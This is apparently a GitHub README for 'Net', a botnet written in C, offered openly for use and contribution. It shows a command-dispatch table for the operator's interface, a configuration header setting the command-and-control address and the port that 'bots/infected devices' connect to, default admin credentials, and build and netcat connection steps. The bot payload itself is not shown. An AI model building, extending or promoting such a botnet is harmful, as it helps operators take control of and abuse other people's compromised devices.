<h1 align="center">
	<img src="https://icon-library.com/images/server-icon/server-icon-24.jpg" width="150px"><br>
    Net - A botnet written in C.
</h1>
<p align="center">
	Net is a very easy-to-use botnet that has several options while being highly customizable.
</p>

<p align="center">
	<a href="https://deno.land" target="_blank">
    	<img src="https://img.shields.io/badge/Version-1.0.0-7DCDE3?style=for-the-badge" alt="Version">
</p>

## Features
Feature  | Description
-------- | -----------
Multi-threading | The server works in the background while the CLI is running.
Sending data | You can send data to all the connected devices.
Clean interface | Net has an easy-to-use clean CLI that is easy to navigate.
Dynamic Commands | Net makes it very easy for you to add your own commands.
	
## Dynamic Commands & Custom Commands
To add commands, simply create your function and then add the custom command and function to `botnet_commands` as shown below.
```c
struct function botnet_commands[] = {
    {"custom_command", custom_function}, // <- The custom command goes right here! Make sure you have already written your function!
    {"?", help_menu},
    {"help", help_menu},
    {"bots", bot_count},
    {"list", bot_count},
    {"server", cnc_details},
    {"banner", display_banner},
    {"clear", clear_screen},
    {"cls", clear_screen},
};
```

## Configuration
To edit the configuration for the botnet, head over to `includes/config/config.h`.
```c
#pragma once


/*
    *    includes/config/config.h
    *    Date: 11/09/21
    *    Author: 0x1CA3
*/


#define USERNAME "admin"
#define PASSWORD "password"
#define MAX_DEVICES 99999
#define CNC_IP "127.0.0.1"
#define CNC_PORT 1337 /* This is the port your bots/infected devices will use to connect */
#define ADMIN_PORT 1233 /* This is the port you will use when connecting to the admin panel */					       
```

## Installation & Setup
```
gcc -o net net.c -lpthread
./net
Open up a new terminal window
Connect to the CnC | Example: nc 127.0.0.1 3434
Login with the default credentials [admin:password]
```

## Update Log
```
[11/9/21] - Removed 'adb_check' option
[11/9/21] - Remade 'Net'
[9/14/21] - Created 'Net'
```
## Screenshots
![botnet.png](https://user-images.githubusercontent.com/86132648/133769422-7a341223-bb15-440f-a437-b285c168307d.PNG)

## Credits
```
https://github.com/0x1CA3
```
### Contributions 🎉
###### All contributions are accepted, simply open an Issue / Pull request.
